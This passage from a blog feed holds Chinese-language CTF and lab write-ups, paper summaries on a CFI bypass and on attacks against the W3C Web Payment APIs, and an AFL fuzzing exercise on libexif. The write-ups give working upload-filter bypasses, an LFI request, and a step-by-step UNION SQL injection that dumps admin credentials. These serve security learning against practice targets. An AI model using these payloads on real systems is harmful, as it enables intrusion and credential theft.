alt="image-20230906143845354"></p><p>代码中没有过滤点，可以通过加点进行绕过</p><p><img src="/2023/09/05/Upload-labs/image-20230906144030007.png" alt="image-20230906144030007"></p><p>此时，服务器获取到的后缀是空，不在黑名单中</p><h4 id="Pass-08"><a href="#Pass-08" class="headerlink" title="Pass-08"></a>Pass-08</h4><p><img src="/2023/09/05/Upload-labs/image-20230906150046786.png" alt="image-20230906150046786"></p><p>源码没有过滤::DATA，可以利用windows的特性</p><p>在window的时候如果文件名+<code>&quot;::$DATA&quot;</code>会把<code>::$DATA</code>之后的数据当成文件流处理,不会检测后缀名，且保持<code>::$DATA</code>之前的文件名，目的就是不检查后缀名</p><p><img src="/2023/09/05/Upload-labs/image-20230906150026942.png" alt="image-20230906150026942"></p><h4 id="Pass-09"><a href="#Pass-09" class="headerlink" title="Pass-09"></a>Pass-09</h4><p><img src="/2023/09/05/Upload-labs/image-20230906153208872.png" alt="image-20230906153208872"></p><p>由于代码没有写循环，代表对于 <code>.</code> 和 <code> space</code>的过滤只会进行一遍，所以可以通过在后缀名后添加 <code>. .</code>来进行绕过</p><h4 id="Pass-10"><a href="#Pass-10" class="headerlink" title="Pass-10"></a>Pass-10</h4><p><img src="/2023/09/05/Upload-labs/image-20230906153917267.png" alt="image-20230906153917267"></p><p><code>$file_name=str_ireplace($deny_file, &quot;&quot;, $file_name)</code>：函数调用会查找 <code>$file_name</code> 中包含在 <code>$deny_ext</code> 数组中的任何子字符串，然后将它们替换为空字符串，即删除这些子字符串</p><p>所以可以通过双写进行绕过，在处理 <code>pphphp</code>时，由于上述函数，中间的php将被替换成空，该后缀仍然会被解析成php</p><p><img src="/2023/09/05/Upload-labs/image-20230906154338920.png" alt="image-20230906154338920"></p>]]></content>
    
    
    <categories>
      
      <category>Basic</category>
      
    </categories>
    
    
    <tags>
      
      <tag>CTF</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>BUUCTFWriteUp1</title>
    <link href="/2023/09/02/BUUCTFWriteUp1/"/>
    <url>/2023/09/02/BUUCTFWriteUp1/</url>
    
    <content type="html"><![CDATA[<p><strong>LFI COURSE 1</strong></p><p><img src="/2023/09/02/BUUCTFWriteUp1/image-20230902093905518.png" alt="image-20230902093905518"></p><p><code>if(isset($_GET[&#39;file&#39;])) &#123; ... &#125;</code>：这是一个条件语句，用于检查是否存在名为 ‘file’ 的 GET 参数。如果存在，代码块内的内容将被执行。</p><p><code>$str = $_GET[&#39;file&#39;];</code>：将名为 ‘file’ 的 GET 参数的值存储在变量 <code>$str</code> 中。</p><p><code>include $_GET[&#39;file&#39;];</code>：这行代码尝试包含一个文件，文件名由 GET 参数 ‘file’ 的值指定</p><p>用户可以通过GET参数来指定要包含的文件，include可能存在LFI（文件包含漏洞攻击）</p><p>尝试?file&#x3D;&#x2F;flag   ?file&#x3D;&#x2F;flag.txt ?file&#x3D;&#x2F;flag.php </p><p>?file&#x3D;&#x2F;flag可以直接得到flag</p><p><img src="/2023/09/02/BUUCTFWriteUp1/image-20230902094347903.png" alt="image-20230902094347903"></p><p><strong>BRUTE 1</strong></p><p>进入靶机后以下界面：</p><p><img src="/2023/09/02/BUUCTFWriteUp1/image-20230902102422665.png" alt="image-20230902102422665"></p><p>随意尝试组合用户名为123，password为123，返回“用户名错误”</p><p>用burpsuite抓包可以得到以下信息</p><p><img src="/2023/09/02/BUUCTFWriteUp1/image-20230902102530889.png" alt="image-20230902102530889"></p><p>根据题目意思Brute为野蛮的，推测为暴力破解，则选择send to Intruder，因为返回为“用户名错误”而不是“用户名或密码错误”，在尝试时，推测可以先确定用户名，再确定密码，不需要两边同时爆破</p><p>所以构造：</p><p><img src="/2023/09/02/BUUCTFWriteUp1/image-20230902103129156.png" alt="image-20230902103129156"></p><p><img src="/2023/09/02/BUUCTFWriteUp1/image-20230902103004685.png" alt="image-20230902103004685"></p><p>用户名字典和密码字典为网上下载，导入后选择Simple list，开始爆破</p><p>当用户名为admin时：</p><p><img src="/2023/09/02/BUUCTFWriteUp1/image-20230902103201354.png" alt="image-20230902103201354"></p><p>所以修改payload：</p><p><img src="/2023/09/02/BUUCTFWriteUp1/image-20230902103408791.png" alt="image-20230902103408791"></p><p>得到正确的值6490</p><p>至此得到用户名为admin，密码为6490，输入可以得到flag</p><p><strong>SQL COURSE 1</strong></p><p><img src="/2023/09/02/BUUCTFWriteUp1/image-20230902150719714.png" alt="image-20230902150719714"></p><p>随便点击</p><p><img src="/2023/09/02/BUUCTFWriteUp1/image-20230902163825700.png" alt="image-20230902163825700"></p><p><img src="/2023/09/02/BUUCTFWriteUp1/image-20230902163842513.png" alt="image-20230902163842513"></p><p>看到在访问backend&#x2F;content_detail.php?id&#x3D;1处，可能存在sql注入点，扔到HackBar中开始测试</p><p>分别尝试<code>?id=1 and 1=1</code>和 <code>?id=1 and 1=2</code> 发现第一条有回显，第二条没有，判断为数字型注入</p><p>判断or是否被过滤：</p><p><code>?id=1 or 1=1</code></p><p><img src="/2023/09/02/BUUCTFWriteUp1/image-20230902170242985.png" alt="image-20230902170242985"></p><p>判断列数：</p><p><code>?id=1 order by 1</code> 有回显</p><p><code>?id=1 order by 2</code>有回显</p><p><code>?id=1 order by 3</code>无回显</p><p>所以表有两列</p><p>确定字段的显示顺序</p><p><code>?id=-1 union select 1,2</code></p><p><img src="/2023/09/02/BUUCTFWriteUp1/image-20230902170731553.png" alt="image-20230902170731553"></p><p>爆破数据库：</p><p><code>?id=-1 union select database(), database()</code></p><p><img src="/2023/09/02/BUUCTFWriteUp1/image-20230902171015321.png" alt="image-20230902171015321"></p><p>根据获得的数据库的名称，获取数据表的信息</p><p><code>?id=-1 union select 1,(select group_concat(table_name) from information_schema.tables where table_schema=&#39;news&#39;)</code></p><p><img src="/2023/09/02/BUUCTFWriteUp1/image-20230902171132043.png" alt="image-20230902171132043"></p><p><code>select group_concat(table_name) from information_schema.tables where table_schema=&#39;news&#39;</code>这部分会连接数据库中的所有表格名称，并以逗号分隔的形式返回。于是得到了表名信息admin, contents</p><p>使用admin表，获取字段信息</p><p><code>?id=-1 union select 1,(select group_concat(column_name) from information_schema.columns where table_schema=&#39;news&#39; and table_name=&#39;admin&#39;)</code></p><p><img src="/2023/09/02/BUUCTFWriteUp1/image-20230902171445924.png" alt="image-20230902171445924"></p><p>此处union select后的1作为占位符，使得结果可以对齐，括号中的查询语句可以获得news库admin表中的所有列名</p><p>获取username</p><p><code>?id=-1 union select 1,(select group_concat(username) from admin)</code></p><p><img src="/2023/09/02/BUUCTFWriteUp1/image-20230902171958351.png" alt="image-20230902171958351"></p><p>获取密码</p><p><code>?id=-1 union select 1,(select group_concat(password) from admin)</code></p><p><img src="/2023/09/02/BUUCTFWriteUp1/image-20230902172038494.png" alt="image-20230902172038494"></p><p>根据得到的信息即可得到flag</p>]]></content>
    
    
    <categories>
      
      <category>Basic</category>
      
    </categories>
    
    
    <tags>
      
      <tag>CTF</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>ReadPaper2</title>
    <link href="/2023/07/27/ReadPaper2/"/>
    <url>/2023/07/27/ReadPaper2/</url>
    
    <content type="html"><![CDATA[<h2 id="WarpAttack-Bypassing-CFI-through-Compiler-Introduced-Double-Fetches-（WarpAttack：通过编译器引入的双重获取绕过CFI）"><a href="#WarpAttack-Bypassing-CFI-through-Compiler-Introduced-Double-Fetches-（WarpAttack：通过编译器引入的双重获取绕过CFI）" class="headerlink" title="WarpAttack: Bypassing CFI through Compiler-Introduced Double-Fetches （WarpAttack：通过编译器引入的双重获取绕过CFI）"></a>WarpAttack: Bypassing CFI through Compiler-Introduced Double-Fetches （WarpAttack：通过编译器引入的双重获取绕过CFI）</h2><h3 id="Introduction"><a href="#Introduction" class="headerlink" title="Introduction"></a>Introduction</h3><p>如今多数系统上运行的软件是由C&#x2F;C++编写的，容易出现内存损坏错误，因此需要对这些程序进行彻底的测试以尽可能的消除错误，但通常测试时不完整的，因此会在代码中添加缓解措施以增加攻击的难度，广泛应用的措施有：</p><p>地址空间布局随机话（ASLR）：操作系统在加载进程的时候，会随机地改变可执行文件、共享库、堆栈和其他内存区域的基地址，使得这些区域在每次运行时都位于不同的内存地址位置。</p><p>堆栈canaries（Stack Canaries）：通过在函数返回地址之前或之后插入一个特殊的随机值（称为堆栈金丝雀或堆栈哨兵），来检测堆栈缓冲区溢出攻击。在函数执行结束时，系统会检查这个堆栈金丝雀的值是否被修改过，如果被修改，就说明发生了堆栈缓冲区溢出攻击。如果检测到这种异常情况，程序通常会立即终止执行，从而防止恶意代码得以执行。</p><p>数据执行预防（DEP）：通过硬件和操作系统的支持，在内存中标记某些区域为”不可执行”，也就是阻止这些区域的数据作为指令被执行。这样一来，即使攻击者成功注入恶意代码到内存中，也无法执行，因为这些区域被标记为只能包含数据而不能执行指令。</p><p>代码重用攻击在这些缓解措施下仍然有效，例如ROP（返回导向编程），针对这一点，CFI（Control-Flow Integrity）被认为是阻止代码重用攻击的关键措施。CFI首先静态计算程序的控制流图（CFG），并确定所有合法的控制流传输目标。然后，CFI会在代码中插入检查，以在运行时验证每个控制流传输。</p><p>但目前的编译器对于缓解措施插入的安全检查代码并不会视为特权代码，所以在进行代码优化时，可能导致安全性遭到破坏使攻击者有Time-of-Check to Time-Of-Use（TOCTTOU）的机会 。</p><p>例如：代码中存在switch语句，执行时通常遵循以下模式，给定一个跳转表和一个索引，程序首先获取索引值以验证边界检查是否满足跳转表大小，然后再次获取索引值以进行实际的跳转处理。由于索引被多次加载（获取），攻击者可以在边界检查后覆盖索引值，最终允许在跳转表之外进行任意跳转。</p><p>本文研究了由双重获取引入的TOCTOU漏洞，并提出了攻击WarpAttack，并在firefox上成功实施</p><h3 id="Threat-Model"><a href="#Threat-Model" class="headerlink" title="Threat Model"></a>Threat Model</h3><p>攻击者能力：</p><ul><li>任意读写：攻击者持有一个内存损坏漏洞（如use-after-free错误），使其能够读写任意内存。C&#x2F;C++ 程序容易受到此类漏洞的影响</li><li>线程控制：攻击者能够主动控制与被攻击程序在同一地址空间内的线程。</li><li>Gadget：受害者程序包含足够的 gadget 代码片段，即带有编译器引入的双重获取的开关跳转表。</li></ul><p><em>Gadget 是一种有用的构造块，可以被组合成攻击载荷，以绕过程序的安全措施和执行恶意操作。这些构造块通常是由程序本身的代码片段组成，例如函数的一部分或条件分支的一小段代码。</em></p><p>攻击者目标是劫持控制流到特定位置</p><p>防御假设：</p><p>不可执行内存：受害者程序受到DEP保护，攻击者无法执行任何注入式攻击，只能进行代码重用攻击</p><p>随机化：受害者程序受地址空间随机化保护</p><p>控制流保护：受害者程序应用完全精确的静态 CFI</p>]]></content>
    
    
    <categories>
      
      <category>Study</category>
      
    </categories>
    
    
    <tags>
      
      <tag>ReadPaper</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>ReadPaper1:WPA</title>
    <link href="/2023/07/26/ReadPaper1/"/>
    <url>/2023/07/26/ReadPaper1/</url>
    
    <content type="html"><![CDATA[<h2 id="A-Formal-Security-Analysis-of-the-W3C-Web-Payment-APIs-Attacks-and-Verification-W3C-Web-支付-API-的正式安全分析：攻击和验证"><a href="#A-Formal-Security-Analysis-of-the-W3C-Web-Payment-APIs-Attacks-and-Verification-W3C-Web-支付-API-的正式安全分析：攻击和验证" class="headerlink" title="A Formal Security Analysis of the W3C Web Payment APIs: Attacks and Verification(W3C Web 支付 API 的正式安全分析：攻击和验证)"></a>A Formal Security Analysis of the W3C Web Payment APIs: Attacks and Verification(W3C Web 支付 API 的正式安全分析：攻击和验证)</h2><h3 id="Introduction"><a href="#Introduction" class="headerlink" title="Introduction"></a>Introduction</h3><p>当下支付环境多样，有Stripe，Google pay，PayPal等多种支付方式，存在的问题有：</p><ul><li>恶意顾客可能会篡改商家与支付处理机构之间的信息流</li><li>支付处理机构的方案可能存在缺陷</li><li>用户可能会被多种不同的用户界面所困惑，从而更容易受到网络钓鱼攻击</li></ul><p>此外，在面对有些支付界面较为复杂时，用户可能直接关闭支付进程</p><p>为此，W3C（World Wide Web Consortium）目前正在开发WPA（Web Payment APIs）这是一种简化和标准化浏览器中的支付和结账流程的方法。其主要思想是，商家不再自己提供用于结账的网页或JavaScript，而是将这个过程交给用户的Web浏览器来处理。浏览器随后呈现给用户全新的支付用户界面（见图1），该界面位于Web上下文之外。在这个用户界面中，用户可以查看订单，选择（预先存储的）送货地址、支付方式和支付处理器（例如使用Stripe信用卡付款）。</p><p><img src="/2023/07/26/ReadPaper1/image-20230727152130120.png" alt="image-20230727152130120"></p><h3 id="Conclusion"><a href="#Conclusion" class="headerlink" title="Conclusion"></a>Conclusion</h3><ul><li>本文的分析是在详细的Web基础设施模型中，对Web Payment的首次分析</li><li>分析基于迄今为止最全面的Web基础设施模型——WIM，并做出了重要扩展</li><li>制定了反映使用WPA进行支付的完整性的精确安全属性：支付意图和支付唯一性。在尝试证明这些属性时，发现了两个关键性的漏洞，并提出了修复措施</li></ul><h3 id="THE-W3C-WEB-PAYMENT-APIS"><a href="#THE-W3C-WEB-PAYMENT-APIS" class="headerlink" title="THE W3C WEB PAYMENT APIS"></a>THE W3C WEB PAYMENT APIS</h3><h4 id="安全属性"><a href="#安全属性" class="headerlink" title="安全属性"></a>安全属性</h4><p><strong>支付意图</strong></p><p>浏览器会将用户表达意图的所有支付存储在一个名为PaymentIntents的字典中，它保证了支付提供者在进行交易时与顾客在支付UI界面中确认的信息一致。具体来说，这意味着支付的发送方、接收方和总金额与顾客在浏览器中确认的信息相符。这个属性可以防止恶意方代表顾客进行未经授权的支付。</p><p><strong>支付唯一性</strong></p><p>每个支付提供者则在其状态中存储所有已执行交易的记录，存储在一个名为”transactions”的映射表中，支付的唯一性确保对于客户授权的每笔付款，任何诚实的支付提供者最多执行一个交易，并且该交易具有正确的值。</p><h4 id="工作流"><a href="#工作流" class="headerlink" title="工作流"></a>工作流</h4><p><img src="/2023/07/26/ReadPaper1/image-20230727102822005.png" alt="image-20230727102822005"></p><ol><li>商家创建支付请求，支付请求中包含字段：id（支付的唯一标识符）&#x2F;商家接受的支付方法（methodData）&#x2F;总花费和一些商品可选细节（details）&#x2F;用户必须提供哪些数据（options：例如地址，电话）</li><li>通过Payment Request API将数据交给浏览器，浏览器根据支付请求中的 methodData（商家支持的支付方式）与已注册的支付处理程序进行对比，并选择在 methodData 中至少一种支付方式注册的所有支付处理程序。</li><li>在进行初步选择后，浏览器对每个选中的支付处理程序触发 CanMakePaymentEvent（支付是否可进行事件）。此事件包含有关所请求支付的基本信息，如商家顶层页面的源地址、支付请求发起的源地址以及适用的支付方式数据集（来自 PR.methodData）</li><li>支付处理程序在接收 CanMakePaymentEvent 后确定是否可以处理该支付请求。此决策过程特定于支付方式，并可能取决于法律要求。</li><li>在接收完所有触发的支付处理程序的响应后，浏览器显示一个特殊的对话框，称为支付 UI（用户界面）。这个支付 UI 不是网站的一部分，而是浏览器本身的界面（参见图1）。支付 UI 允许顾客输入（或选择存储的）所需信息，如送货地址、电子邮件地址以及支付详细信息。</li><li>支付详细信息包括选择可用支付处理程序和支付方式。如果顾客输入（或选择存储的或更改的）送货地址，还需要额外的步骤：因为这可能会改变送货费用，因此商家网站会收到一个部分匿名化的地址以重新计算送货费用。</li><li>顾客提交选择后，浏览器组装一个 PaymentRequestEvent（支付请求事件）并将其交给顾客选择的支付处理程序。该 PaymentRequestEvent 包含与 CanMakePaymentEvent 相同的数据（见上文），以及顾客输入的支付数据，如信用卡号、过期日期和验证号码。</li><li>在接收 PaymentRequestEvent 后，支付处理程序采取必要的步骤来执行或至少促进支付。</li><li>在执行这些步骤后，支付处理程序通过创建 PaymentHandlerResponse（支付处理程序响应）来完成其工作。此响应包含（再次）支付方式标识符和一个 details 字段，其确切内容取决于支付方式。details 的内容可以是支付提供者的某些签名支付确认，或者仅为“反映”信用卡数据等简单内容。</li><li>收到支付处理程序响应后，浏览器创建一个支付响应并将其返回给商家的网站。支付响应包含来自处理程序响应的 details、所选支付方式以及商家在 PR.options 中请求的额外数据，如送货地址。</li><li>商家现在可以检查响应（例如，验证信用卡数据的有效性）并通过表示结账过程完成（在这种情况下，浏览器关闭支付 UI）或表示出现问题而终止流程。</li></ol><p>一旦顾客进行了修改并重新提交，浏览器会向随后选择的支付处理程序触发另一个 PaymentRequestEvent，其中包含相同的支付标识符，但可能不同的支付细节（例如，由顾客选择的不同支付方式）。支付处理程序然后处理并可能更新支付（如有必要），再次用处理程序响应触发浏览器创建支付响应并将其交给商家。此时，商家可以再次接受支付响应或发起另一个重试。</p><h4 id="存在的漏洞"><a href="#存在的漏洞" class="headerlink" title="存在的漏洞"></a>存在的漏洞</h4><p><strong>Double Charging with Retry（重试引起的重复支付）</strong></p><p>在这个攻击过程中，假设有一个恶意商家和一个诚实的顾客。攻击利用了WPA中的重试机制。</p><ol><li>顾客发起结账：顾客在恶意商家的网站上发起结账请求。</li><li>商家创建支付请求：商家创建一个正常的支付请求，并将其交给浏览器处理。</li><li>浏览器引导支付流程：浏览器根据WPA规范的步骤，引导顾客完成支付流程的步骤6到11，这包括选择支付方式、确认支付等。</li><li>收到支付响应：商家收到顾客的支付响应，但在这里进行了攻击。</li><li>触发重试：商家触发了一个重试请求（retry），这意味着商家在第一次支付时出现了问题，要求顾客切换到不同的支付处理器和支付方式提供商，因为第一个支付方式据称不起作用。</li><li>显示错误信息：浏览器在其支付界面中显示了错误信息，告知顾客需要切换支付方式。</li><li>顾客选择不同的支付方式：由于顾客认为第一个支付方式存在问题，她选择了不同的支付处理器和支付方式提供商，并再次提交支付请求。</li><li>触发新的支付处理器：浏览器触发了新的支付处理器，该处理器执行第二次支付。</li><li>第二次支付：新的支付处理器执行了第二次支付，这就是攻击实现了双重收费的地方。</li><li>结账完成：攻击完成后，整个结账流程继续进行，顾客完成了支付流程，而没有任何提示表明她支付了两次。</li></ol><p>这个攻击是由于浏览器的行为，而不是支付处理器的实现。第二个支付处理器无法检测到它是在重试上下文中调用的，因为它之前没有见过整个交易的支付id。攻击者可以反复利用这个漏洞，让顾客反复被收取双重费用，而商家和支付处理器无法察觉。</p><p>修复措施：</p><p>可以在交易重复使用不同处理程序时通知支付处理程序，以便它可以撤销支付并在成功撤销后再触发第二个支付处理程序。或者支付处理程序可以在其响应中包含一个状态，指示是否已经进行了支付，并阻止在这种情况下更改支付处理程序。在与W3C Web Payments Working Group的讨论中，他们选择了一个非常简单的修复方法，即完全禁止更改支付处理程序，尽管这可能会迫使顾客中止整个流程，如果一开始选择的支付处理程序实际上不能正常工作。这是规范最终采用的方法。</p><p><strong>Ambiguous Payment Method Data（模棱两可的支付数据）</strong></p><p>在这个攻击过程中，假设商家是恶意的，而其他人都是诚实的。攻击利用了WPA规范中的一个特定字段——methodData。以下是攻击的步骤：</p><ol><li>商家创建支付请求：商家创建一个支付请求PR，其中methodData字段包含两个条目，都是相同的支付方式，即具有相同的支付方式标识符。根据W3C规范，这是完全有效的。其中一个条目可能不包含任何费用，而另一个可能包含非常高的费用。</li><li>提交支付请求：商家将支付请求PR提交给WPA（如往常一样）。这触发浏览器在其安装的支付处理器列表中搜索与PR中给定的支付方式标识符匹配的处理器，并查询匹配的处理器。</li><li>显示支付界面：之后，浏览器显示支付界面。我们假设用户总是选择第一个条目，即不包含额外费用的条目。她输入所需数据并提交。</li><li>调用支付处理器：现在，浏览器将带有支付细节的PaymentRequestEvent（包括完整的methodData列表，即两个条目）交给所选的支付处理器。</li><li>支付处理器决策：然而，PaymentRequestEvent不包含用户从methodData中选择了哪个条目的信息。支付处理器现在必须决定使用哪个支付方式数据条目。由于规范中也没有关于此的指导，我们假设支付处理器总是选择最后一个支付方式数据条目（在我们的攻击中会产生巨额的额外费用）并执行支付。</li><li>完成支付：其余步骤与常规支付流程相同。结果是，顾客被收取了她从未同意的费用，而没有任何提示。</li></ol><p>这种攻击并不依赖于浏览器和支付处理器在存在多个适用的methodData条目时如何确定选择哪一个，只要存在这样的可能性，它们选择不同的条目即可。这使得顾客被收取未知费用的攻击成为可能。</p><p>修复措施：</p><p>浏览器可以拒绝模棱两可的条目，或者将用户的选择传递给支付处理程序。我们建议采用第一种选项，以保持API接口的稳定性。因为每次用户选择的变化都可能需要更新支付处理程序的实现，导致接口的不稳定性和不一致性。</p><h4 id="拓展"><a href="#拓展" class="headerlink" title="拓展"></a>拓展</h4><p>为了全面分析WPA，对WIM做出了以下拓展</p><ol><li>可扩展的DOM事件处理：WPA大量使用DOM事件来触发支付处理程序。为了模拟这些事件的处理过程，WIM（Web Infrastructure Model）的浏览器模型被扩展，引入了一组待处理事件和一个可扩展的处理函数。当浏览器被触发处理DOM事件时，其中一个待处理事件会被随机选择，从待处理事件集合中移除，并交给处理函数处理。这样，模拟了事件的传递和处理过程。</li><li>Service Workers：Service Workers是在浏览器中后台运行的事件驱动型JavaScript程序，可用于为Web应用程序提供离线功能。在WPA中，支付处理程序被视为Service Workers的实例。因此，WIM的浏览器模型被扩展，加入了一组注册的Service Workers。类似于事件处理，当浏览器被触发时，Service Worker可以被非确定性地选择执行，从而模拟了Service Worker的运行过程。</li><li>脚本API扩展：WPA本身是WIM浏览器模型的重要扩展。WPA已被各大主流浏览器实现，这导致了在真实执行环境中，网页应用程序和脚本（诚实或不诚实）可能会干扰WPA的各个部分，从而扩大了攻击面。为此，WIM的脚本API被扩展，将WPA规范中定义的API函数形式化为脚本命令，即脚本可以输出命令，指示浏览器调用具有给定参数列表的API函数。这些API函数的定义遵循WPA规范，并允许对其进行形式化的分析。</li></ol><h3 id="思考"><a href="#思考" class="headerlink" title="思考"></a>思考</h3><p><strong>为什么此处对于WPA模型安全性的分析都是假设商家是恶意的而用户是诚实的</strong></p><p>个人理解：首先，用户的行为通常是会受到较大约束的，发起主动攻击的难度较大。多数攻击是针对正常运作的系统发起的。虽然用户的一些攻击行为可能会获取不当利益，例如进行虚假支付。但是从安全研究的角度来看，通常更关注的是那些针对系统本身的漏洞和攻击。其次，当进行系统安全性评估和漏洞分析时，假设商家是恶意的可以帮助研究人员更好地理解系统的脆弱点和潜在风险。</p>]]></content>
    
    
    <categories>
      
      <category>Study</category>
      
    </categories>
    
    
    <tags>
      
      <tag>ReadPaper</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>Exercise2</title>
    <link href="/2023/07/19/Exercise2/"/>
    <url>/2023/07/19/Exercise2/</url>
    
    <content type="html"><![CDATA[<h2 id="Exercise2-libexif"><a href="#Exercise2-libexif" class="headerlink" title="Exercise2 libexif"></a>Exercise2 libexif</h2><h3 id="任务目标："><a href="#任务目标：" class="headerlink" title="任务目标："></a>任务目标：</h3><p>对libexif EXIF解析库进行模糊测试，目标是在 libexif 0.6.14 中找到 <a href="https://nvd.nist.gov/vuln/detail/CVE-2009-3895">CVE-2009-3895</a> （一种基于堆的缓冲区溢出）的崩溃&#x2F;PoC 和 <a href="https://nvd.nist.gov/vuln/detail/CVE-2012-2836">CVE-2012-2836</a> （越界读取漏洞）的另一个崩溃。</p><h3 id="实验流程"><a href="#实验流程" class="headerlink" title="实验流程"></a>实验流程</h3><p><strong>下载并解压libexif</strong></p><figure class="highlight awk"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs awk">wget https:<span class="hljs-regexp">//gi</span>thub.com<span class="hljs-regexp">/libexif/</span>libexif<span class="hljs-regexp">/archive/</span>refs<span class="hljs-regexp">/tags/</span>libexif-<span class="hljs-number">0</span>_6_14-release.tar.gz<br>tar -xzvf libexif-<span class="hljs-number">0</span>_6_14-release.tar.gz<br></code></pre></td></tr></table></figure><p>libexif是一个开源的用于处理Exchangeable Image File Format (EXIF) 数据的C语言库，提供了一组功能强大的API，用于读取、写入和操作EXIF数据。</p><p><strong>安装libexif</strong></p><figure class="highlight routeros"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs routeros">cd libexif-libexif-0_6_14-release/<br>sudo apt-<span class="hljs-built_in">get</span> install autopoint libtool gettext libpopt-dev<br>autoreconf -fvi<br>./configure <span class="hljs-attribute">--enable-shared</span>=<span class="hljs-literal">no</span> <span class="hljs-attribute">--prefix</span>=<span class="hljs-string">&quot;<span class="hljs-variable">$HOME</span>/fuzzing_libexif/install/&quot;</span><br>make<br>make install<br></code></pre></td></tr></table></figure><p><code>autoreconf</code> 是一个用于自动重建 Autotools 构建系统的工具，该命令通常用于在源代码目录中运行 Autotools 工具链，以重新生成配置脚本 <code>configure</code>、构建规则 <code>Makefile.in</code> 和其他相关文件。这样可以确保配置和构建系统与当前环境和依赖项保持同步。</p><p><strong>安装EXIF</strong></p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><code class="hljs bash"><span class="hljs-built_in">cd</span> <span class="hljs-variable">$HOME</span>/fuzzing_libexif<br>wget https://github.com/libexif/exif/archive/refs/tags/exif-0_6_15-release.tar.gz<br>tar -xzvf exif-0_6_15-release.tar.gz<br><br><span class="hljs-built_in">cd</span> exif-exif-0_6_15-release/<br>autoreconf -fvi<br>./configure --enable-shared=no --prefix=<span class="hljs-string">&quot;<span class="hljs-variable">$HOME</span>/fuzzing_libexif/install/&quot;</span> PKG_CONFIG_PATH=<span class="hljs-variable">$HOME</span>/fuzzing_libexif/install/lib/pkgconfig<br>make<br>make install<br></code></pre></td></tr></table></figure><p>由于libexif是一个库，是一组功能的集合而本身不是一个独立的执行文件，因此需要安装使用这个库的一个应用程序来进行模糊测试。使用库的程序通常会验证输入数据的有效性和合法性。模糊测试工具可能生成具有不同格式的输入，包括不合法的输入。使用该库的程序可以验证并解析这些输入。</p><p><strong>验证安装</strong></p><figure class="highlight awk"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs awk"><span class="hljs-variable">$HOME</span><span class="hljs-regexp">/fuzzing_libexif/i</span>nstall<span class="hljs-regexp">/bin/</span>exif<br></code></pre></td></tr></table></figure><p><strong>获取样本</strong></p><figure class="highlight awk"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs awk">cd <span class="hljs-variable">$HOME</span>/fuzzing_libexif<br>wget https:<span class="hljs-regexp">//gi</span>thub.com<span class="hljs-regexp">/ianare/</span>exif-samples<span class="hljs-regexp">/archive/</span>refs<span class="hljs-regexp">/heads/m</span>aster.zip<br>unzip master.zip<br></code></pre></td></tr></table></figure><p><strong>使用alf-clang-lto编译libexif和exif</strong></p><figure class="highlight routeros"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><code class="hljs routeros">rm -r <span class="hljs-variable">$HOME</span>/fuzzing_libexif/install<br>cd <span class="hljs-variable">$HOME</span>/fuzzing_libexif/libexif-libexif-0_6_14-release/<br>make clean<br><span class="hljs-built_in">export</span> <span class="hljs-attribute">LLVM_CONFIG</span>=<span class="hljs-string">&quot;llvm-config-11&quot;</span><br><span class="hljs-attribute">CC</span>=afl-clang-lto ./configure <span class="hljs-attribute">--enable-shared</span>=<span class="hljs-literal">no</span> <span class="hljs-attribute">--prefix</span>=<span class="hljs-string">&quot;<span class="hljs-variable">$HOME</span>/fuzzing_libexif/install/&quot;</span><br>make<br>make install<br></code></pre></td></tr></table></figure><figure class="highlight routeros"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs routeros">cd <span class="hljs-variable">$HOME</span>/fuzzing_libexif/exif-exif-0_6_15-release<br>make clean<br><span class="hljs-built_in">export</span> <span class="hljs-attribute">LLVM_CONFIG</span>=<span class="hljs-string">&quot;llvm-config-11&quot;</span><br><span class="hljs-attribute">CC</span>=afl-clang-lto ./configure <span class="hljs-attribute">--enable-shared</span>=<span class="hljs-literal">no</span> <span class="hljs-attribute">--prefix</span>=<span class="hljs-string">&quot;<span class="hljs-variable">$HOME</span>/fuzzing_libexif/install/&quot;</span> <span class="hljs-attribute">PKG_CONFIG_PATH</span>=<span class="hljs-variable">$HOME</span>/fuzzing_libexif/install/lib/pkgconfig<br>make<br>make install<br></code></pre></td></tr></table></figure><p>afl-clang-lto 是 AFL的一个定制版本，它使用了 Link Time Optimization（LTO）技术。LTO 可以在链接时优化代码，包括在不同编译单元之间进行全局的代码优化。通过使用 afl-clang-lto 编译，可以提高模糊测试的代码覆盖率，因为优化的代码更有可能探索到更多路径和分支。同时相比于afl-clang，afl-clang-lto具有更好的性能。</p><p><strong>进行模糊测试</strong></p><figure class="highlight awk"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs awk">afl-fuzz -i <span class="hljs-variable">$HOME</span><span class="hljs-regexp">/fuzzing_libexif/</span>exif-samples-master<span class="hljs-regexp">/jpg/</span> -o <span class="hljs-variable">$HOME</span><span class="hljs-regexp">/fuzzing_libexif/</span>out<span class="hljs-regexp">/ -s 123 -- $HOME/</span>fuzzing_libexif<span class="hljs-regexp">/install/</span>bin/exif @@<br></code></pre></td></tr></table></figure><p>得到如下输出</p><p><img src="/2023/07/19/Exercise2/image-20230721171848925.png" alt="image-20230721171848925"></p><h3 id="检查"><a href="#检查" class="headerlink" 